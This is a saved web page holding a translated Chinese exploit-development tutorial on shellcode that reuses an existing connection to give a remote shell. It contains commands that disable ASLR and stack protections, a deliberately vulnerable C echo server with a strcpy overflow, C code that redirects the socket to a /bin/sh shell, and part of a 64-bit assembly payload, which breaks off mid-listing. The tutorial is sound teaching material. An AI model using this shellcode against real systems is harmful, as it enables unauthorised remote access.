@@ -1,0 +1,678 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】远程漏洞利用：无需借助套接字的Shellcode - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="Shellcode,shellcode开发,远程漏洞利用"/>
+    
+        <meta name="description" content="在本文中，我将介绍一种优雅的技术，无需借助socket来获得一个shell访问存在漏洞的远端机器。虽然这个技术不是我发明的，但我发现它的确很有趣，所以本文的重点是这种技术本身，而不是利用漏洞的具体方式。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】远程漏洞利用：无需借助套接字的Shellcode</h2>
+                <div class="article-msg">
+                    <span class="time">2017-01-11 13:50:38</span>
+                    
+                                        <span class="read">阅读：14900次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3402"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3402" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440"
+                             target="_blank">来源： 0x00sec.org</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2522399780" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2522399780" style="color:#848e99;">shan66</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p9.qhimg.com/t016d09957f1e7bcf5b.jpg" title="t014f7bed27d7cd3b77.jpg" alt="http://p6.qhimg.com/t014f7bed27d7cd3b77.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">翻译：</span></strong></span><a href="http://bobao.360.cn/member/contribute?uid=2522399780" target="_blank" textvalue="shan66" style="text-decoration: none;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">shan66</span></strong><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"></span></strong></span></a></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">预估稿费：200RMB（不服你也来投稿啊！）</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong><strong>投稿方式：发送邮件至</strong><a href="mailto:linwei@360.cn" target="_self" style="text-decoration: none;"><span style="color: rgb(0, 112, 192);"><strong>linwei#360.cn</strong></span></a><strong>，或登陆</strong><a href="http://bobao.360.cn/contribute/index" target="_blank" style="color: rgb(0, 112, 192); text-decoration: none;"><strong>网页版</strong></a><strong>在线投稿</strong></strong></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前言</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在本文中，我将介绍一种优雅的技术，来获得一个shell访问易受攻击的远程机器。虽然这个技术不是我发明的，但我发现它的确很有趣，所以本文的重点是这种技术本身，而不是利用漏洞的具体方式。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">设置环境</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">为了专注于远程shell代码本身，而不是把精力用在如何规避ASLR、非可执行堆栈等防御措施上面，我们将禁用这些安全功能。一旦熟悉了获取shellcode的方法，可以重新启用这些保护措施，以进一步练习如何突破这些安全设置。因此，这是一个非常有趣的练习，如果你想练手的话。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先，我们将禁用ASLR。为此，可以使用以下命令：</span></p><pre class="brush:plain;toolbar:false">echo&nbsp;0&nbsp;|&nbsp;sudo&nbsp;tee&nbsp;/proc/sys/kernel/randomize_va_space</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这些设置都是临时性质的，在下次重新启动时会全部还原。如果你想要在不重新启动机器的情况下立即还原所有设置的话，可以使用如下所示的命令：</span></p><pre class="brush:plain;toolbar:false">echo&nbsp;2&nbsp;|&nbsp;sudo&nbsp;tee&nbsp;/proc/sys/kernel/randomize_va_space</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了禁用其余的安全功能，我们可以使用以下选项来编译带有安全漏洞的服务器：</span></p><pre class="brush:plain;toolbar:false">-fno-stack-protector&nbsp;-z&nbsp;execstack</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这些选项会禁用堆栈的canarie保护，并赋予堆栈执行权限。这样的话，我们就得到了一个非常容易利用的环境。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">带有安全漏洞的服务</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在，让我们编写一个带有缓冲区溢出漏洞的小型回显服务器，这样我们就可以远程利用它了。这个程序很简单，你能发现代码中的缓冲区溢出漏洞吗？&nbsp;你当然可以。</span></p><pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;stdio.h&gt;
+#include&nbsp;&lt;string.h&gt;
+&nbsp;
+#include&nbsp;&lt;sys/socket.h&gt;
+#include&nbsp;&lt;netinet/in.h&gt;
+#include&nbsp;&lt;arpa/inet.h&gt;
+&nbsp;
+int
+process_request&nbsp;(int&nbsp;s1,&nbsp;char&nbsp;*reply)
+{
+&nbsp;&nbsp;char&nbsp;result[256];
+&nbsp;
+&nbsp;&nbsp;strcpy&nbsp;(result,&nbsp;reply);
+&nbsp;&nbsp;write&nbsp;(s1,&nbsp;result,&nbsp;strlen(result));
+&nbsp;&nbsp;printf&nbsp;(&quot;Result:&nbsp;%p\n&quot;,&nbsp;&amp;result);
+&nbsp;&nbsp;return&nbsp;0;
+}
+&nbsp;
+int
+main&nbsp;(int&nbsp;argc,&nbsp;char&nbsp;*argv[])
+{
+&nbsp;&nbsp;struct&nbsp;sockaddr_in&nbsp;&nbsp;&nbsp;server,&nbsp;client;
+&nbsp;&nbsp;socklen_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;len&nbsp;=&nbsp;sizeof&nbsp;(struct&nbsp;sockaddr_in);
+&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s,s1,&nbsp;ops&nbsp;=&nbsp;1;
+&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reply[1024];
+&nbsp;
+&nbsp;&nbsp;server.sin_addr.s_addr&nbsp;=&nbsp;INADDR_ANY;
+&nbsp;&nbsp;server.sin_family&nbsp;=&nbsp;AF_INET;
+&nbsp;&nbsp;server.sin_port&nbsp;=&nbsp;htons(9000);
+&nbsp;
+&nbsp;&nbsp;s&nbsp;=&nbsp;socket&nbsp;(PF_INET,&nbsp;SOCK_STREAM,&nbsp;0);
+&nbsp;&nbsp;if&nbsp;((setsockopt&nbsp;(s,&nbsp;SOL_SOCKET,&nbsp;SO_REUSEADDR,&nbsp;&amp;ops,&nbsp;sizeof(ops)))&nbsp;&lt;&nbsp;0)
+&nbsp;&nbsp;&nbsp;&nbsp;perror&nbsp;(&quot;pb_server&nbsp;(reuseaddr):&quot;);
+&nbsp;&nbsp;bind&nbsp;(s,&nbsp;(struct&nbsp;sockaddr&nbsp;*)&nbsp;&amp;server,&nbsp;sizeof&nbsp;(server));
+&nbsp;&nbsp;listen&nbsp;(s,&nbsp;10);
+&nbsp;
+&nbsp;&nbsp;while&nbsp;(1)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s1&nbsp;=&nbsp;accept&nbsp;(s,&nbsp;(struct&nbsp;sockaddr&nbsp;*)&amp;client,&nbsp;&amp;len);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf&nbsp;(&quot;Connection&nbsp;from&nbsp;%s\n&quot;,&nbsp;inet_ntoa&nbsp;(client.sin_addr));
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset&nbsp;(reply,&nbsp;0,&nbsp;1024);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read&nbsp;(s1,&nbsp;reply,&nbsp;1024);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;process_request&nbsp;(s1,&nbsp;reply);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;close&nbsp;(s1);
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;return&nbsp;0;
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">很好，下面我们就来编译它，让它变成一个最容易利用的服务器：</span></p><pre class="brush:plain;toolbar:false">gcc&nbsp;-g&nbsp;-fno-stack-protector&nbsp;-z&nbsp;execstack&nbsp;-o&nbsp;target&nbsp;target.c</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面，我们来展示它的脆弱性。在一个终端运行这个带有安全漏洞的服务器，然后在另一个终端运行下列命令：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;perl&nbsp;-e&nbsp;&#39;print&nbsp;&quot;A&quot;x1024;&#39;&nbsp;|&nbsp;nc&nbsp;localhost&nbsp;9000</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在运行服务器的终端中，我们将会看到如下所示的内容：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;&nbsp;./target
+Connection&nbsp;from&nbsp;127.0.0.1
+Result:&nbsp;0x7fffffffdbf0
+Segmentation&nbsp;fault&nbsp;(core&nbsp;dumped)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">注意，我已经添加了打印局部变量的地址的语句，从而可以验证ASLR是否被禁用。每次执行这个二进制代码的时候，应该总是看到相同的数字（当然，如果你修改了这个程序，数字就会随之改变）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在，我们可以拿这个程序来练手，学习如何使用各种触手可及的shellcode来获取一个本地shell。尽管这个练习非常简单，但是我们建议您至少要练习一次。具体过程本文不作详细介绍，因为关于缓冲区溢出漏洞利用的教程，在网络上面数不胜数。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">远程Shell</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">下面我们介绍如何获取远程shell。注意，这里的关键在于“远程”。这意味着在易受攻击的机器和攻击者之间，隔着一个网络。或者换句话说，我们必须通过一些套接字来发送/接收数据。根据这一要求，有两种方式可以用来获得远程shell：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">如果你的shellcode创建一个服务器套接字来启用来自外部的连接请求，并从本地shell发送和接收数据&nbsp;...那么，这就是一个直接远程shell。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">如果你的shellcode连接回一个预先指定的主机，并且这个主机上运行的服务器软件正在等待受害者的连接...那么，这就这是一个反向远程shell。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">关于这两种远程shell的详细信息，请访问<a href="https://0x00sec.org/t/remote-shells-part-i/269" _src="https://0x00sec.org/t/remote-shells-part-i/269">https://0x00sec.org/t/remote-shells-part-i/269</a></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">看到这两个定义后，你可能会联想到RHOST/RPORT之类的变量....是的，它们可以用来告诉payload连接的主机地址和相应的端口。对于反向shell来说，您必须将这些信息存放到payload中，以便连接回来。对于直接shell你通常需要定义端口，服务器就会等待连接。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但是，至少对于Unix机器来说，还有第三种选择。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">连接复用</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">当执行远程漏洞利用代码时，为了利用此漏洞，您已经连接到了服务器...所以，为什么不重用这个已经建立好的连接呢？这真是一个不错的想法，因为它不会显示任何会引起受害者怀疑的东西，例如来自服务器未知服务的开放端口等。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">实现这一点的方法也非常巧妙。它是基于这样的事实，即系统是按顺序分配文件描述符的。知道了这一点，我们就可以在建立连接之后立即复制一个当前文件的描述符，除非服务器的负载很重，否则我们得到的文件描述符等于用于我们连接的套接字的文件描述符+1，这样很容易就能知道我们的连接的文件描述符了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一旦知道了当前连接的文件描述符，我们只需要将它复制到文件描述符0、1和2（stdin、stdout和stderr），就可以生成一个shell了。这样一来，该shell的所有输入/输出都会被重定向到我们的套接字了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">还不明白吗？肯定没读过<a href="https://0x00sec.org/t/remote-shells-part-i/269" _src="https://0x00sec.org/t/remote-shells-part-i/269">https://0x00sec.org/t/remote-shells-part-i/269</a></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">页面上的文章吧？不过没关系，现在去看也不晚。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">相应的C代码如下所示：</span></p><pre class="brush:plain;toolbar:false">int&nbsp;sck&nbsp;=&nbsp;dup&nbsp;(0)&nbsp;-&nbsp;1;&nbsp;//&nbsp;Duplicate&nbsp;stdin
+dup2&nbsp;(sck,&nbsp;0);
+dup2&nbsp;(sck,&nbsp;1);
+dup2&nbsp;&nbsp;(sck,&nbsp;2);
+execv&nbsp;(&quot;/bin/sh&quot;,&nbsp;NULL);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">看...根本就没有使用套接字代码！如果我们把它变成一个shellcode，并且设法利用远程服务器的漏洞来运行该代码，我们就能够获得一个shell来访问远程机器，而这个shell所使用的连接，正好就是原来向远程服务器投递利用代码的那个连接。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当然，也你已经注意到这种技术存在一些缺点。就像我们所提到的那样，如果服务器比较繁忙的话（同时建立许多连接），这种方法就很难奏效了。此外，正常的服务器会在变成守护进程之前关闭所有的文件描述符，因此我们可能需要尝试使用其他值来推测文件描述符。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个技术是前一段时间跟@_py进行讨论的时候，由他想出来的。我们当时检查的原始代码可以在这里找到：</span></p><pre class="brush:plain;toolbar:false">http://shell-storm.org/shellcode/files/shellcode-881.php4</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但是，这是一个32位代码，所以我重新制作了对应的64位版本，以及一个运行漏洞利用代码的Perl脚本。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">64位版本的Shellcode</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">下面的代码您就将就着看吧(我这才发现自己的汇编技能真是生锈了)，不过它确实可以正常运行，并且只比原来的32bits版本长了3个字节。我的64位版本的Shellcode如下所示：</span></p><pre class="brush:plain;toolbar:false">section&nbsp;.text
+global&nbsp;_start
+_start:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;;&nbsp;s&nbsp;=&nbsp;Dup&nbsp;(0)&nbsp;-&nbsp;1
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;rax,&nbsp;rax
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;rax
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;rax
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;rax
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;rsi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;rdx
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;rax
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;rdi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;al,&nbsp;32
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;DUP&nbsp;(rax=32)&nbsp;rdi&nbsp;=&nbsp;0&nbsp;(dup&nbsp;(0))
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dec&nbsp;rax
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;rax
